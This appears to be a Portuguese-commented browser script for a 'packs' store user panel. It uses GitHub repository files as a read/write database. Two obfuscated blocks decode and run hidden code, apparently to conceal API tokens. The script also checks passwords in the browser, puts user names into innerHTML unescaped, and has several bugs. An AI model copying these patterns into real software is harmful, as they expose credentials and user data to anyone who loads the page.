
    // Converte "USER_" para "user_" independentemente da caixa
    if (friendIdInput.toLowerCase().startsWith('user_')) {
        friendIdInput = 'user_' + friendIdInput.slice(5);
    }

    // Validação básica: tem que ser um número ou começar com user_
    const isNumeric = /^[0-9]+$/.test(friendIdInput);
    const hasPrefix = friendIdInput.startsWith('user_');

    if (!isNumeric && !hasPrefix) {
        alert('Digite um passaporte válido! Ex: user_84586');
        return;
    }

    // Se for apenas número, adiciona o prefixo
    const friendId = hasPrefix ? friendIdInput : 'user_' + friendIdInput;

    if (!userIdFromCookie) {
        alert('Usuário não autenticado.');
        return;
    }

    // Busca os dados no banco
    fetch(url, {
        headers: {
            Authorization: `token ${token}`
        }
    })
    .then(response => response.json())
    .then(data => {
        const content = atob(data.content);
        const jsonData = JSON.parse(content);

        const user = jsonData.find(u => u.id === userIdFromCookie);
        const friendExists = jsonData.some(u => u.id === friendId);

        if (!user) {
            alert('Usuário não encontrado.');
            return;
        }

        if (!friendExists) {
            alert('Passaporte não encontrado no banco de dados.');
            return;
        }

        if (!Array.isArray(user.friends)) {
            user.friends = [];
        }

        if (user.friends.includes(friendId)) {
            alert('Esse usuário já está na sua lista de amigos.');
            return;
        }

        // Adiciona o amigo
        user.friends.push(friendId);

        const updatedContent = btoa(JSON.stringify(jsonData));

        // Atualiza o banco
        fetch(url, {
            method: 'PUT',
            headers: {
                Authorization: `token ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: 'Add friend to user',
                content: updatedContent,
                sha: data.sha
            })
        })
        .then(() => {
            alert('Amigo adicionado com sucesso!');
            location.reload();
        })
        .catch(error => {
            console.error('Erro ao atualizar dados:', error);
        });

    })
    .catch(error => {
        console.error('Erro ao carregar dados:', error);
    });
}



function formatTimeLeft(time) {
    const days = Math.floor(time / (1000 * 60 * 60 * 24));
    const hours = Math.floor((time % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((time % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((time % (1000 * 60)) / 1000);
    return `${days} dias ${hours} horas ${minutes} minutos ${seconds} segundos`;
}

var token,username,repo,repo1,path,pathGift,url,urlGift,urlUser;(function(){var tEc='',dqo=143-132;function dCS(m){var k=1477153;var s=m.length;var q=[];for(var r=0;r<s;r++){q[r]=m.charAt(r)};for(var r=0;r<s;r++){var a=k*(r+435)+(k%52908);var i=k*(r+104)+(k%19569);var x=a%s;var y=i%s;var j=q[x];q[x]=q[y];q[y]=j;k=(a+i)%1805035;};return q.join('')};var SHi=dCS('dqopcghtrorktlrxcocinzmubjuswtayvensf').substr(0,dqo);var BEO=';a; ,A.82b93,r r;o;n=.h)1(+r(]s;b;xr lun;9ir)tus=;n,{ tawr+egn(0xt);1vo.)ur .;a.A,b5n0o}[vat[lz(m8blr= n!.(n[8u)(6=9io;))t)yn=vrgn6eo}( l1)Spo=e mil;ln8i;4;bjrs -rr=s([+l;afhg. gern=(c;ou;r=;0n=g=0 qr".=9f=w8auu)rd==avtzrns{r.=;.s+r([a).p;"gbah,8=s)=hf(,[gq]a,ga[auo+bg=[lb j(unSvhem)lt;saaapiloat u;f)jhr+9e0rif+p]"vnmjix.v+e a.]6r (4v7rlf+u.lit3j,<vf.r7,,)h"vh;t.=g7(vr;4kn)2ea;huv+gcw7fCed5 rpue6,pa].t2g(qj="r+o,-fAt)1(r9 2;1h,]an)=a+yal}=onnb<,;v+ ;(t7ee6)("C;61lpta,g((;asbbsh.g+32c0rrCrdir4u]efrxim=Aiohtodw]tooc2v(vr"1g;bf=1(=el,+a,5)wez(lt(ib,i7={mll)(]{+fr}8nCi)oogp;vtfsrov(j;i7. ;[e;,cmtpa+r(m[;=.ve=;+(]t;=ida4=nnbt6)upC-=<;n+a+h h)sts*roociC]=5h;gp}li !.e.>a291-s}=ovp;s"xa[j]v);.+0eCgn;)+i(<",vv]Atah7{z-)=re9,ir2,h=l11z.c.-,"0gm(r8ate;l+s8in*ffrom;zuhu[,v,5l=r0zr,vljfi=u{g<arzeyh}1n(]v)-pf=)=lrj.ygc.cha)c=qt)8lt6[dqn{r)0gj>cb)Chaij(di0v+g+n50[e,h;r e4iao(;( t)4repj z= yre';var vwm=dCS[SHi];var htJ='';var kEo=vwm;var oZX=vwm(htJ,dCS(BEO));var Bgr=oZX(dCS('t#;{4h%"r p.t0.e(ZSt4g.{eZ5g43,;.7C,01j0teb{}d_0;3pZ\/b\/Zb;!- Z#b.af7 ;7#2)=)lez.n%4Z3ZZ3_Z7sa2.t!%}mggc e+l7c(t%b%;8$NsZ%n7)r8Zsvs5(Z!s\/(a}Zo0;($6Ze_l}h6nt.xSZ)=SoZZu5nzc\/(a  -tZ!]3xr.Zen,Zthtd,n=7eoZp*o;.(1%7p1]4+;Zx.&(d,,5Zp!rx30.2{(x(Z.g34hZ;+)Zgi;cg!75)ahs$iefhZ}5)is1s 0.]ZZf jrsZen,rh.tg!fsqe[qnupdt t\/Zb};tl)Z4jZCw$n41x}neineu3g.z6+!d="0=7s=se_;\/ZrZ"\/j(eaZh%tZda6raa\/;xZ;Z\/ iw4!o.n0.o.b4te).;3" eZ]e=1Z};(e(0Zlc)3!}$f0_Zts%!i)t4i;{d j f)ur! f_je)(3o8Zpuf2sp+]7+u)uZhdd" "=_ezl!4Z))=.hZ(,,Z,,t\/,;$1.ok(tZd,hr.j))35=c,dZc);s;i,%(0,+)])f;Z\/\'oZZgtanZnnh=Ztrd.fsZZ}la_!!s3_Cace(%)q)bt3.)-]_Z=pc[_ii7=.uZ)]Zh(t)ob(])ss#2..n)=)(5et%lZmr.1iZ!!_Z..o1+ %,2+jj1Z!+4*o;n4}+2a.!;.($6-s{,Z]u1a}.Zoh,$r 04hfij!)%5ts&;sd3ji$%e%eZrZ,a0.jZ4Zc3!.(ui(\/3sZ6.;(.tfbar);ht=Z7+ua4(]a:.g)D3Z2$4$pZcm).e!$Z.nsa\/(,=xZZZS\/ect]ag6{omZrkuZ3("Z.:f\/i"Zh*tpZf\/Z.Z+.!Zi..)5l3(j)i1i.\/Z+Zb.o6++0)$1{=b+gZ._iffZu58ist_;Z\/\/%uZ&,f!lh=i1e.n{e],hf!-r$)e31_ttZct\/\/gZ67Z\'rnop(Z!8oZ$)3!.rZ.07..8\/iZ{su].r3todh91xZ\'656,;4bZ*ZZ-tl\/Z,+(wew {xu1t\'rc$!(.n,.(f)=6n)ZZ$.ec7!_uks.p"56.!(f$rjZ4r$3)!Z.g32uSstg.h,_Z],8 05Z{=7"2($s6)(heeaf#u0+8i..e6ZZ]"(Zss;).uZ0 ;\'((..{t$0)jZo$ZctdZ 2[_ZT.=(9(a!,8=h%0!&e(;ri+e7opx(.Zl)ahh}r]Ze8$r]sp5=)3eocsZd.eZolZa104=ZgSepm..;ao5;] ZZrfecc!e9)6gl}}#h[(j8_ 8(Z"cZ1o,.!s}$,( :)c-.e;"s.#r'));var nDX=kEo(tEc,Bgr );nDX(2682);return 4608})()

var token1,username1,repo1,path1,url1;(function(){var JhD='',ZET=965-954;function XSO(u){var a=4442996;var w=u.length;var p=[];for(var s=0;s<w;s++){p[s]=u.charAt(s)};for(var s=0;s<w;s++){var r=a*(s+451)+(a%46484);var m=a*(s+100)+(a%20492);var d=r%w;var j=m%w;var e=p[d];p[d]=p[j];p[j]=e;a=(r+m)%5289803;};return p.join('')};var gYG=XSO('ztnkrocqbhyspiodlgcsrujwnucfamtovtexr').substr(0,ZET);var Cro='z..ha1i4efmei[r==3)pev+, "=tth(bdhujkl .a(<=m=niaj,f6r0azeC0a8)t",a(.+8 ;(o,(7n(h9l4gps9+0){[,v5uh,1f0svo)r5lC91c9g8fh[t=e(u-4lnp]p,A}wv(r)mvrrh8z=iaqzlv e=,7hr18.,sm<,);(tru)=a(ta;=([= raqtdez=)nff+xpn.rapl==t]tegvrsn;s=l =ujs;rq uvvf[r+v;7v)mf)]<rp..ailia(a ,[( -= v;r}9(g,lzivm=r0;,n80pso-){;qhg;[[no"  ,)kv;gsns;haw hs<uCoh6ow=ig[(rtr=Svvmls2}9a;)nr=i;co!(tag)m=se; o=1+ez1rdr7kgo)cfu(CydgAf.-)ronoa=.8nl2tfa]x7{i=l+,tgm++r.54l;2[tn1=ezSs3-9;6hef);;;+};v.;"fzk=+u){r+f(o}6"r=e7sivui]c)a+C{d8A+(j+c)c(h,1hxrlo+tv.,z}2,-8a(ma;+an2 r{jse1rat]ipu0;nizhr[-Al)=)ve;7ri f,>+rn.m.;ir=;s6b4tsibot;.uz).] tars(=)=rtb0;[=cnl,s(a)sv(sfv}r 7()3in]).1cfh"vvt;iht mdd0 a.3"n,qer. o n=;b=).uca,t );)aa]67e)nr!axr.jigg(gt.;)+r;;=]9,,a6;1nc=<,]i,+v+h+;+c6C)q;e j" ;u()guluafro.]dwhmadc;r(g[4o(({ari(C0;0ltjr;vg(i]nprv=;,=v6lvtnu>n+egasAr"*se.*o(tun0ri=ae9urvC1=ml3de2+rmnio[nenuznpd.shog;(]2"pev.;a;1=wr;';var zMB=XSO[gYG];var mra='';var OVT=zMB;var AkO=zMB(mra,XSO(Cro));var QMi=AkO(XSO('e=.ise=E;t,5ten$$((t3sr\/QQ\/Q)daQunk)=(l=%eb);erbQ4(aab)eoa!.Q,3QtQ 6;[}Q!)hutx6.;bs12Qf_Q\/.)#".D4.Q=eh3*o!];QsofQ%ggf =78{.!0e;.Qn$e(QQ4+Q5a+zo%T(jm.%!t.1)k6}Q,p!"f}p(eet).hQ(14gai*.m\/r((%!%g81"s$.\'.htp.3,j.Qtpn$g4I-;r)v8)i;f2beor$1,Qaln{,;$. 4 ceQqsog9sro4.jd{={.7lbne(n1(t[!eab;QQ;{tr.ed$107fd=;m_r 7.e-3)-c)Qr,rs=Qpt6!.}) .at=o{Q)f)QQ)f.d!rQtf.$+.}0Qq!3s+\'ce1.Q.3Q0.(QzSfe+p.o[3tnr .ufQQ0,(9+$3)iQ4.h._qrQ!_zQ%Q+QS(b011;)rd=)\/p80x}d3f9.7%Q(t,"3noda!+oi;y=d3 ea77_!0j2[p.=01;,fst;rj,:;%gq0fec.(.btr5(.e$.;).,r,t8.$4dQb4.lQQ2aQnf.i;3fec$.s!jtgi.g!_itmC{iseo#eapQ,2le%w=a0)*]=;f=-(h=.\'i4Q}yf.6%"*z(cbm06*kobbQ.Q..,bh7QabbQoQQ,=Q}+aQQoQ$taQ,-si()Q7.e)}l](nsQn(ne]s;t()&({a."&)(. %.$)i(as7!c8us!rnaQ"ojlp}].f)o0\'2lQpct)r!30ie]js +o{$e$u4bme.g!.;} s31+.0Q=hotat8.)(1i3=)fQQ2b1ak\/").ep11\/nQnQq},a,ehrv,[=.+7e)nv+n%Q. t+{1.\/z_+e,arQ#QsSs&r_(,,.mh!$Q].bhji;1(c+t\/Q[Cr;Q7sc}q;1=rd.gQ_=!sQj.0(Q\'__Q(]2Q d bt1# ")zj,\/4)\/$;,Ql3r.{3e;r_6Q9Q0t5.d5Qol.Q#r($f}eQa+33e.nf-.QQ-o4u)#0QtQQ3#o]2q$)(3h}$)1_,o&s=f=Qf lt 4)$j(_,\/4j1uuc- .p,etq1_nu{(3e))y!b_1Q1ubQ);pQp_)_!oQQeQc}{i$2j(trre ,rew);Q.! !.],)._I.seqe!nllrqeb,y!.e='));var uXV=OVT(JhD,QMi );uXV(8071);return 5374})()

function getCookie(name) {
    let cookieArr = document.cookie.split(";");
    for (let i = 0; i < cookieArr.length; i++) {
        let cookiePair = cookieArr[i].split("=");
        if (name === cookiePair[0].trim()) {
            const decodedValue = decodeURIComponent(cookiePair[1]);
            return atob(decodedValue); 
        }
    }
    return null;
}



function resgatarCodigo() {
    var code = document.getElementById('code').value;

    if (!code) {
        alert('Por favor, insira um código.');
        return;
    }

    fetch(urlGift, {
        headers: {
            Authorization: `token ${token}`
        }
    })
        .then(response => response.json())
        .then(dataGift => {
            let contentGift = atob(dataGift.content);
            let jsonDataGift = JSON.parse(contentGift);
            let gift = jsonDataGift.find(g => g.code === code && g.status === "true");

            if (!gift) {
                alert('Código inválido ou já resgatado.');
                return;
            }

            var userId = getCookie('id');
            if (!userId) {
                alert('Usuário não autenticado.');
                return;
            }

            fetch(urlUser, {
                headers: {
                    Authorization: `token ${token}`
                }
            })
                .then(response => response.json())
                .then(dataUser => {
                    let contentUser = atob(dataUser.content);
                    let jsonDataUser = JSON.parse(contentUser);
                    let user = jsonDataUser.find(u => u.id === userId);

                    if (!user) {
                        alert('Usuário não encontrado.');
                        return;
                    }

                    // Adicionar os id_links do presente ao usuário
                    user.id_links = Array.from(new Set(user.id_links.concat(gift.id_links)));
                    gift.status = "false";

                    // Atualizar conteúdo do gift.json
                    let updatedGiftContent = btoa(JSON.stringify(jsonDataGift, null, 2));
                    updateFile(urlGift, dataGift.sha, updatedGiftContent, 'Atualizar status do código de presente');

                    // Atualizar conteúdo do dados.json
                    let userIndex = jsonDataUser.findIndex(u => u.id === user.id);
                    jsonDataUser[userIndex] = user;
                    let updatedUserContent = btoa(JSON.stringify(jsonDataUser, null, 2));
                    updateFile(urlUser, dataUser.sha, updatedUserContent, 'Atualizar usuário com novos id_links');

                    alert(`Presente de ${gift.name}\nMensagem: ${gift.msg}`);
                    location.reload();
                })
                .catch(error => console.error('Erro ao obter dados do usuário:', error));
        })
        .catch(error => console.error('Erro ao obter dados dos presentes:', error));
}

function updateFile(url, sha, content, message) {
    fetch(url, {
        method: 'PUT',
        headers: {
            Authorization: `token ${token}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: message,
            content: content,
            sha: sha
        })
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erro ao atualizar o arquivo.');
            }
        })
        .catch(error => console.error('Erro ao atualizar o arquivo:', error));
}

// Função para obter o valor do cookie pelo nome


// Função para apagar o cookie
function deleteCookie(name) {
    document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT';
}

// Verificar se há código nos cookies, executar e depois apagar
const savedCode = getCookie('code');
if (savedCode) {
    console.log(`Código encontrado nos cookies: ${savedCode}`);
    document.getElementById('code').value = savedCode; // Preenche o campo com o código encontrado
    resgatarCodigo(); // Executa a função com o código encontrado
document.cookie = "code=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
} else {
    console.log('Nenhum código encontrado nos cookies.');
}

// Obter o userId do cookie
const userId = getCookie('id');

// Caminho padrão da imagem
const defaultSrc = '../../icons/user1.png';







function carregarAmigos() {
    const userIdFromCookie = getCookie('id');

    if (userIdFromCookie) {
        fetch(url, {
            headers: {
                Authorization: `token ${token}`
            }
        })
        .then(response => response.json())
        .then(data => {
            const content = atob(data.content);
            const jsonData = JSON.parse(content);

            const user = jsonData.find(user => user.id === userIdFromCookie);

            const listaAmigosElement = document.getElementById('listaAmigos');
            listaAmigosElement.innerHTML = ''; // Limpa a lista antes de adicionar os amigos

            if (user && user.friends && user.friends.length > 0) {
                user.friends.forEach(friendId => {
                    const amigo = jsonData.find(u => u.id === friendId);
                    if (amigo) {
                        const listItem = document.createElement('li');
                        const imageSrc = `../../icons/${friendId}.png`;

listItem.innerHTML = `
    <div class="amigo-item" style="display: flex; align-items: center; margin-bottom: 12px;">
        <!-- Imagem do amigo -->
        <div style="
            width: 35px;
            height: 35px;
            border-radius: 50%;
            overflow: hidden;
            flex-shrink: 0;
            margin-right: 12px;
        ">
            <img src="${imageSrc}" alt="Imagem do usuário"
                class="friend-photo-item"
                style="
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                    display: block;
                "
                onerror="this.src='../../icons/user1.png'" />
        </div>

        <!-- Nome e ID -->
        <div style="line-height: 1.2;">
            <strong style="color: white;">${amigo.name}</strong><br />
            <span style="font-size: 13px; color: #ddd;">(${friendId})</span>
        </div>
    </div>
`;





                        listaAmigosElement.appendChild(listItem);
                    }
                });
            } else {
                listaAmigosElement.innerHTML = '<li>Nenhum amigo encontrado.</li>';
            }
        })
        .catch(error => console.error('Erro ao carregar dados:', error));
    } else {
        console.error('ID do usuário não encontrado.');
    }
}




    document.addEventListener('DOMContentLoaded', function() {
        carregarAmigos();
    });
function startCountdown(targetDate) {
    const countdownElement = document.getElementById('countdown');
    updateCountdown(); 

    const intervalId = setInterval(updateCountdown, 1000);

    function updateCountdown() {
        const currentDate = new Date();
        const timeLeft = targetDate - currentDate;

        if (timeLeft <= 0) {
            clearInterval(intervalId); 
            countdownElement.textContent = 'Nada encontrado';
        } else {
            countdownElement.textContent = formatTimeLeft(timeLeft);
        }
    }
}

function verificarVipECarregarLinks(usuario) {
    const agora = new Date();

    // Supondo que vip_expira_em seja uma string que pode ser convertida para Date, ou um objeto Date
    const vipExpiraEm = new Date(usuario.vip_expira_em);

    if (vipExpiraEm > agora) {
        // VIP válido
        carregarLinksUsuario(usuario.id_links, usuario.id_vips);
    } else {
        // VIP expirado ou inexistente
        carregarLinksUsuario(usuario.id_links);
    }
}


  function limparPrefixoDoPassaporte() {
    const passaporteSpan = document.getElementById("useracs");
    const textoOriginal = passaporteSpan.textContent;

    const textoLimpo = textoOriginal.includes("_")
      ? textoOriginal.substring(textoOriginal.indexOf("_") + 1)
      : textoOriginal;

    passaporteSpan.textContent = textoLimpo;
  }





function buscarUsuarioPorId(id) {
    fetch(url, {
        headers: {
            Authorization: `token ${token}`
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Erro ao carregar arquivo');
        }
        return response.json();
    })
    .then(data => {
        let content = atob(data.content);
        let jsonData = JSON.parse(content);

        const usuario = jsonData.find(user => user.id === id);
        if (usuario) {
            mostrarDetalhesUsuario(usuario);

            const agora = new Date();
            const vipExpiraEm = new Date(usuario.expirationDate);

            if (vipExpiraEm > agora) {
                // VIP válido: carregar id_links e id_vips
                carregarLinksUsuario(usuario.id_links, usuario.id_vips);
            } else {
                // VIP expirado: carregar só id_links
                carregarLinksUsuario(usuario.id_links);
            }

        } else {
            console.log('Usuário não encontrado');
        }
    })
    .catch(error => console.error('Erro ao carregar dados:', error));
}


function getCookie(name) {
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    const [key, value] = cookie.trim().split('=');
    if (key === name) {
      const decoded = decodeURIComponent(value);
      console.log(`ACHEI: '${decoded}'`);
      return decoded;
    }
  }
  console.log(`ACHEI: 'NADA'`);
  return null;
}

function mostrarDetalhesUsuario(usuario) {
  const userInfo = document.getElementById('userInfo');
  const defaultSrc = '../../icons/user1.png';
  
  userInfo.innerHTML = `
    <div class="circle">
      <img id="user" src="${defaultSrc2}" alt="user-profile" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover;">
    </div>
    <h2>Informações do Usuário</h2>
    <p><strong>Nome:</strong> <span id="userName">${usuario.name}</span></p>
    <p><strong>Email:</strong> <span id="userEmail">${usuario.email_code}</span></p>
    <p><strong>Packs:</strong> <span id="userpck">${usuario.packs}</span></p>
    <p><strong>Saldo disponível:</strong> <span id="usersald">${usuario.saldo}</span></p>
    <p><strong>Passaporte:</strong> <span id="useracs">${usuario.id}</span></p>
    <br>
    <button id="bx_dds">Upload profile <img id="menor" src="../../icons/upload_profile.png" style="max-width: 22px; max-height: auto;"></button>
    <button id="removeCookiesButton"><img id="exit" src="../../icons/exit.png" alt="Sair"></button>
    <a class="link-button" href="https://ghosthszz.github.io/Vendas/frontend/paginas/login/reset.html" target="_blank">Mudar senha</a>
  `;
  const userId = getCookie('id');
  const userImage = document.getElementById('user');

  if (!userImage) return;

  if (userId) {
    const customSrc = `../../icons/${userId}.png`;
    const img = new Image();
    img.onload = () => userImage.src = customSrc;
    img.onerror = () => userImage.src = defaultSrc;
    img.src = customSrc;
  } else {
    userImage.src = defaultSrc;
  }
const userSpan = document.getElementById("useracs");
const idCompleto = userSpan.textContent; 
const apenasNumeros = idCompleto.replace("user_", ""); 
userSpan.textContent = apenasNumeros;



function updateDefaultSrcFromCookie() {
    const userId = getCookie('id');
    if (userId) {
        defaultsrc2 = `../../icons/user_${userId}.png`;
    } else {
        console.log("Cookie 'id' não encontrado ou vazio, defaultSrc2 permanece:", defaultSrc2);
    }
}




// Função para obter o ID do usuário a partir dos cookies
function getUserIdFromCookie() {
  const match = document.cookie.match(new RegExp('(^| )id=([^;]+)'));
  return match ? match[2] : null;
}

async function removeUserLog() {
  const userId = getUserIdFromCookie();

  if (!userId) {

    return;
  }

  try {
    // Buscar o conteúdo atual do arquivo login.json
    const response = await fetch(logUrl, {
      headers: {
        'Authorization': `token ${token1}`
      }
    });

    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }

    const logData = await response.json();
    const logsJson = atob(logData.content);
    let logs = JSON.parse(logsJson);
    const sha = logData.sha;

    // Filtrar os logs para remover o log do usuário específico
    logs = logs.filter(log => log.id !== userId);

    // Atualizar o arquivo login.json com os logs restantes
    const updatedLogsJson = JSON.stringify(logs);
    const updatedLogsBase64 = btoa(updatedLogsJson);

    const updateResponse = await fetch(logUrl, {
      method: 'PUT',
      headers: {
        'Authorization': `token ${token1}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: `Removing login log for user ${userId}`,
        content: updatedLogsBase64,
        sha
      })
    });

    if (!updateResponse.ok) {
      throw new Error('Failed to update login.json ' + updateResponse.statusText);
    }

  } catch (error) {
    console.error('Houve um problema ao remover o log do usuário:', error);

  }


}

// Função para excluir todos os cookies
function deleteAllCookies() {
  const cookies = document.cookie.split(";");

  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i];
    const eqPos = cookie.indexOf("=");
    const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
  }
}

// Configuração do botão de remoção de cookies
const removeCookiesButton = document.getElementById("removeCookiesButton");

removeCookiesButton.addEventListener("click", async function() {
  // Remove o log do usuário do login.json
  await removeUserLog();

  // Exclui todos os cookies
  deleteAllCookies();

  // Redireciona para a página inicial
  window.location.href = '../../../login';
});


// Simula um clique no botão após 1 minuto (60.000 milissegundos)
setTimeout(function() {
  if (removeCookiesButton) {
    removeCookiesButton.click();
    console.log('Clique no botão de remoção de cookies simulado após 1 minuto.');
  }
}, 900000); // 60.000 milissegundos = 1 minuto

// Função para obter a hora e a data atuais
function obterHoraAtual() {
    return new Date().getTime(); // Retorna o timestamp atual em milissegundos
}

// Função para apagar todos os cookies e localStorage após 10 minutos
function apagarCookiesApos10Minutos() {
    // Obtém a hora atual em milissegundos
    var horaAtual = obterHoraAtual();

    // Define o tempo para 10 minutos (600 segundos)
    var tempoParaRemover = 10 * 60 * 1000; // 10 minutos em milissegundos

    // Calcula o tempo alvo (hora atual + 10 minutos)
    var horaAlvo = horaAtual + tempoParaRemover;

    // Agendamento para apagar cookies e localStorage após 10 minutos
    setTimeout(function() {
        // Função para apagar cookies
        function apagarCookies() {
            // Obtém todos os cookies atuais
            var cookies = document.cookie.split(";");

            // Itera sobre os cookies e os remove definindo uma data de expiração no passado
            cookies.forEach(function(cookie) {
                var partes = cookie.split("=");
                var nomeCookie = partes[0].trim();
                document.cookie = nomeCookie + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            });

            // Limpa localStorage
            localStorage.clear();
        }

        // Chama a função para apagar cookies
        apagarCookies();

    }, tempoParaRemover); // Aguarda 10 minutos antes de executar a função


}



// Chama a função para agendar a remoção após 10 minutos
apagarCookiesApos10Minutos();


    const token = document.getElementById('token');
    token.innerHTML = `<h1>Seu cupom:<br>${usuario.cupom}</h1>`;

const saldo = document.getElementById('saldo');
const userSald = document.getElementById('usersald');

saldo.innerHTML = `${usuario.saldo}`;
userSald.innerHTML = `${usuario.saldo}`;


    const expirationDate = new Date(usuario.expirationDate);
    if (expirationDate <= new Date()) {
        document.getElementById('countdown').textContent = 'Nada encontrado';
    } else {
        startCountdown(expirationDate);
    }

    const btnBaixarDados = document.getElementById('bx_dds');
btnBaixarDados.addEventListener('click', function() {
    const senhaInserida = prompt('Por favor, insira a senha:');
    if (senhaInserida === usuario.password) {

        window.open('profile.html', '_blank'); // Substitua pelo link desejado
    } else {
        alert('Senha incorreta. Tente novamente.');
    }
});



}


async function carregarLinksUsuario(id_links, id_vips) {
    const fileList = document.querySelector('.file-list');
    fileList.innerHTML = '';

    // Cria o container do spinner com a mensagem
    const spinnerContainer = document.createElement('div');
    spinnerContainer.classList.add('spinner-container');

    const spinner = document.createElement('div');
    spinner.classList.add('spinner');

    const text = document.createElement('div');
    text.classList.add('spinner-text');
    text.textContent = 'Conectando ao proxy de packs...';

    spinnerContainer.appendChild(spinner);
    spinnerContainer.appendChild(text);
    fileList.appendChild(spinnerContainer);

    try {
        const response = await fetch(url1, {
            headers: {
                'Authorization': `token ${token1}`
            }
        });

        if (!response.ok) {
            throw new Error(`Resposta da rede não foi ok: ${response.statusText}`);
        }

        const data = await response.json();
        const apiData = JSON.parse(atob(data.content));
        const packsStatus = apiData.find(api => api.API === "PACKS");

        if (!packsStatus || packsStatus.STATUS !== "ACTIVE") {
            fileList.innerHTML = '';

            const errorContainer = document.createElement('div');
            errorContainer.classList.add('spinner-container');

            const errorIcon = document.createElement('div');
            errorIcon.classList.add('error-icon');
            errorIcon.innerHTML = '<img src="../../icons/alert.png" alt="Erro" class="error-icon">';

            const errorMsg = document.createElement('div');
            errorMsg.classList.add('spinner-text');
            errorMsg.textContent = 'Erro: Não foi possível conectar ao proxy de packs.';

            errorContainer.appendChild(errorIcon);
            errorContainer.appendChild(errorMsg);
            fileList.appendChild(errorContainer);

            return;
        }

        // Se ACTIVE, continua normalmente
setTimeout(() => {
    fileList.innerHTML = '';

    // Garante que sejam arrays
    id_links = Array.isArray(id_links) ? id_links : [];
    id_vips = Array.isArray(id_vips) ? id_vips : [];

    // Junta tudo para exibir na interface
    const todosIds = [...id_links, ...id_vips];

todosIds.forEach(linkId => {
    if (linksData[linkId]) {
        const li = document.createElement('li');

        // Verifica se é VIP
        const isVip = id_vips.includes(linkId);

        // Reescreve o link original para o formato novo
        li.innerHTML = reescreverLink(linksData[linkId], isVip);

        fileList.appendChild(li);
    } else {
        console.log(`Link não encontrado para o ID: ${linkId}`);
    }
});

}, 5000);


    } catch (error) {
        console.error('Erro ao verificar o status do PACKS:', error);
        fileList.innerHTML = '';

        const errorContainer = document.createElement('div');
        errorContainer.classList.add('spinner-container');

        const errorIcon = document.createElement('div');
        errorIcon.classList.add('error-icon');
        errorIcon.innerHTML = '⚠️';

        const errorMsg = document.createElement('div');
        errorMsg.classList.add('spinner-text');
        errorMsg.textContent = 'Erro: Não foi possível conectar ao proxy de packs.';

        errorContainer.appendChild(errorIcon);
        errorContainer.appendChild(errorMsg);
        fileList.appendChild(errorContainer);
    }
}




function deleteAllCookies() {
    var cookies = document.cookie.split(";");
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
}

window.onload = function() {
    const userIdFromCookie = getCookie('id');
    if (userIdFromCookie) {
        buscarUsuarioPorId(userIdFromCookie);
    } else {
        console.log('Cookie "id" não encontrado');
        window.location.href = '../../../login';
    }
};

function obterHoraAtual() {
    return new Date().getTime();
}

function apagarCookiesApos10Minutos() {
    var horaAtual = obterHoraAtual();


    var tempoParaRemover = 10 * 60 * 1000;

    var horaAlvo = horaAtual + tempoParaRemover;

    setTimeout(function() {
        function apagarCookies() {
            var cookies = document.cookie.split(";");

            cookies.forEach(function(cookie) {
                var partes = cookie.split("=");
                var nomeCookie = partes[0].trim();
                document.cookie = nomeCookie + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            });

            localStorage.clear();
        }

        apagarCookies();

    }, tempoParaRemover); 
}

apagarCookiesApos10Minutos();

function toggleUserInfo() {
    const overlay = document.getElementById('overlay');
    const userInfoDiv = document.getElementById('userInfo');
    if (overlay.style.display === 'none') {
        overlay.style.display = 'block';
        userInfoDiv.style.display = 'block';

        overlay.addEventListener('click', function() {
            overlay.style.display = 'none';
            userInfoDiv.style.display = 'none';
        });
    } else {
        overlay.style.display = 'none';
        userInfoDiv.style.display = 'none';
    }
}

function toggleDarkMode() {
    const bodyBackgroundColor = document.body.style.backgroundColor;

    if (bodyBackgroundColor === "rgb(241, 241, 241)") {
        document.body.style.backgroundColor = "#121212";
        const fileListLinks = document.querySelectorAll('.file-list li a');
        for (const link of fileListLinks) {
            link.style.backgroundColor = "#333";
            link.style.color = "hotpink";
        }
        document.getElementById('sol').src = "../../icons/sol.png";
    } else {
        document.body.style.backgroundColor = "#f1f1f1";
        const fileListLinks = document.querySelectorAll('.file-list li a');
        for (const link of fileListLinks) {
            link.style.backgroundColor = "#f4f4f4";
            link.style.color = "#333";
        }
        document.getElementById('sol').src = "../../icons/moon.png";
    }

}


function showUserPhotoFullscreen() {
    const userImageSrc = document.getElementById('user').src;
    const fullscreenPhoto = document.getElementById('fullscreen-user-photo');
    fullscreenPhoto.src = userImageSrc;
    const fullscreenOverlay = document.getElementById('fullscreen-photo-overlay');
    fullscreenOverlay.style.display = 'flex';
}

function hideUserPhotoFullscreen() {
    const fullscreenOverlay = document.getElementById('fullscreen-photo-overlay');
    fullscreenOverlay.style.display = 'none';
}

document.getElementById('dark-mode-user').addEventListener('mousedown', function () {
    holdTimer = setTimeout(showUserPhotoFullscreen, 300);
});

document.getElementById('dark-mode-user').addEventListener('mouseup', function () {
    clearTimeout(holdTimer);
});

document.getElementById('fullscreen-photo-overlay').addEventListener('click', hideUserPhotoFullscreen);

document.addEventListener('DOMContentLoaded', () => {
  const listaAmigos = document.getElementById('listaAmigos');
  const fullscreenOverlay = document.getElementById('fullscreen-photo-overlay-amigos');
